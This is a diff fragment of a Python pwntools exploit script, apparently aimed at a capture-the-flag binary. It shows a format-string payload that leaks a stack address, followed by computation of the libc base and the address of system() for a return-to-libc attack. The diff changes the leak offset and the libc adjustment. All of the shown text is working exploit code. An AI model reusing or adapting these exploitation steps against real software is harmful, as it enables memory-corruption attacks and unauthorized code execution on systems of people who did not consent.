@@ -127,7 +127,7 @@ p.send(payload)
 
 p.recvuntil(b"\n\n")
 payload = ''
-payload += 'leak:%77$p'
+payload += 'leak:%15$p'
 
 #pause()
 p.sendline(payload)
@@ -136,7 +136,7 @@ p.recvuntil('leak:')
 leak = int(p.recv(14),16) 
 log.info('\tleak : '+ hex(leak))
 
-libc_base = leak - libc.symbols['__libc_start_main'] - 231
+libc_base = leak - libc.symbols['__libc_start_main']
 system = libc_base + libc.symbols['system']
 
 log.info('\tlibc base '+ hex(libc_base))
